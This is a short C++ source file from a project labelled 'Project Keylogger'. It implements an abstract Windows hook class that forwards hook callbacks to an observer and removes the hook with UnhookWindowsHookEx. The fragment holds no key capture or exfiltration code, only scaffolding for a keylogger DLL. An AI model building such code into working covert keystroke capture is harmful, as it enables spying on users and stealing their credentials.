/**
 *							Project Keylogger
 */


#include					"keylogger_dll/AHook.h"

/**
 * AHook {abstract} implementation
 */


/**
 * @param HookObserver&
 */
AHook::AHook(const IHookObserver& hookObserver) : _observer(hookObserver){
}

/**
 * Notify the HookObserver _observer that a callback have been called.
 * @param int
 * @param LPARAM
 * @param WPARAM
 * @return void
 */
void							AHook::notify(const int code, const WPARAM wParam, const LPARAM lParam) {
    _observer.update(wParam, lParam);
}

/**
 * Unset the hook.
 * @return bool
 */
bool							AHook::unsetHook() {
	if (UnhookWindowsHookEx(_hHook) == TRUE)
		return true;
	return false;
}

/**
* Get the hook
* @return HHOOK
*/
const HHOOK						AHook::getHook() const
{
	return _hHook;
}